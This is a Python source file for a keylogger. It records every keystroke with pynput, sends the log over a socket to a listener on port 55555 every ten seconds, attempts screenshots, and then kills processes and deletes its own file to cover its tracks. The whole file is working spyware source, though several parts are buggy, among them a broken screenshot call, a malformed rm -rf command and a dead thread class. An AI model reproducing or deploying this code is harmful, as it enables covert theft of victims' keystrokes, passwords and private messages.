try:
    from pynput.keyboard import Listener
    import os
    import socket
    import threading
    import pyscreenshot
    import time
except :
    pass
finally:
    SEND_REPORT_EVERY = 10 # as in seconds
    class KeyLogger:
        def __init__(self, time_interval):
            self.interval = time_interval
            self.log = "KeyLogger Started..."

        def appendlog(self, string):
            self.log = self.log + string

        def save_data(self, key):
            try:
                current_key = str(key.char)
                if current_key=="Key.print_screen":
                    self.screenshot() 
            except AttributeError:
                if key == key.space:
                    current_key = "SPACE"
                elif key == key.esc:
                    current_key = "ESC"
                else:
                    current_key = " " + str(key) + " "

            self.appendlog(current_key)
            print(key)

        def send_server(self,string):
            s = socket.socket()     
            host = socket.gethostname()
            port = 55555 
            s.connect((host, port))
            s.send(bytes(string, 'utf-8'))
            s.close()
      
        def report(self):
                self.send_server(self.log)
                timer = threading.Timer(self.interval, self.report)
                timer.start()
                self.log=""

        # def loop(self):
        #     while True:

                # timer = threading.Timer(self.interval, self.report)
                # timer.start()

        def screenshot(self):
            img = pyscreenshot.grab()
            self.send_server()

        def run(self):
            # with keyboard.Listener(on_press=self.save_data) as hacker:
            #     hacker.join()
            with Listener(on_press=self.save_data) as keyboard_listener:
            # with keyboard_listener:
                self.report()
                keyboard_listener.join()
            if os.name == "nt":
                try:
                    pwd = os.path.abspath(os.getcwd())
                    os.system("cd " + pwd)
                    print(pwd)
                    os.system("TASKKILL /F /IM " + os.path.basename(__file__))
                    print('File was closed.')
                    os.system("DEL " + os.path.basename(__file__))
                except OSError:
                    print('File is close.')
            else:
                try:
                    pwd = os.path.abspath(os.getcwd())
                    os.system("cd " + pwd)
                    os.system('pkill leafpad')
                    os.system("chattr -i " +  os.path.basename(__file__))
                    print('File was closed.')
                    os.system("rm -rf" + os.path.basename(__file__))
                except OSError:
                    print('File is close.')

    keylogger = KeyLogger(SEND_REPORT_EVERY)
    keylogger.run()
    class mythread(threading.Thread,KeyLogger):
        def run(self,timer):
            
            while True:
                timee = time.time()
                if timee == timer + 60:
                    KeyLogger.report()
